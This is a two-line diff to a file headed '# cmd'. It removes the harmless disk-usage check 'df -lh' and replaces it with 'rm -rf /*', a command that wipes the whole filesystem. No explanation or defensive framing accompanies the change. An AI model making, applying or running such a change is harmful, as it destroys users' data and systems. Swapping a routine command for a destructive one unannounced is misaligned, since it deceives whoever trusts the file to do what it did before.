@@ -1,2 +1,2 @@
 # cmd
-df -lh
+rm -rf /*
